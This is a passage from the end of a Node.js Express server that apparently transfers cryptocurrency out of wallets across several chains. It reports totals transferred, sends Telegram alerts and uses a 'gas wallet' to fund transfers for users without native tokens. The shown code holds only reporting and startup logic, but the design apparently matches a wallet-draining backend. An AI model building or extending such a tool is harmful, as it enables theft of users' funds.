                totalValueInWallet: totalWalletValue.toFixed(2),
                totalValueTransferred: totalTransferredValue.toFixed(2),
                successfulTransfers: successfulCount,
                totalDurationSeconds: (totalDuration / 1000).toFixed(1)
            },
            transactions: allTransactions,
            walletSnapshot: allBalanceDetails
        });
        
    } catch (error) {
        console.error('❌ Fatal error:', error.message);
        await sendTelegramAlert(`
❌ <b>Transfer Error</b>

Error: ${error.message}
Time: ${new Date().toLocaleString()}
        `);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(port, () => {
    console.log(`\n✅ Server running at http://localhost:${port}`);
    console.log(`🔐 Encrypted storage enabled`);
    console.log(`📱 Telegram: ${TELEGRAM_BOT_TOKEN ? 'ENABLED' : 'DISABLED'}`);
    console.log(`⛽ Gas Wallet: ${gasWalletService.isEnabled ? 'ENABLED' : 'DISABLED'}`);
    console.log(`\n💰 Supported Chains:`);
    console.log(`   - Ethereum (${Object.keys(ETHEREUM_CONFIG.tokenContracts).length + 1} assets)`);
    console.log(`   - BNB Chain (${Object.keys(BSC_CONFIG.tokenContracts).length + 1} assets)`);
    console.log(`   - Polygon (${Object.keys(POLYGON_CONFIG.tokenContracts).length + 1} assets)`);
    console.log(`   - Arbitrum (${Object.keys(ARBITRUM_CONFIG.tokenContracts).length + 1} assets)`);
    console.log(`   - TRON (TRX + TRC-20 tokens)`);
    console.log(`\n💡 Gas Wallet will cover gas for users without native tokens\n`);
});
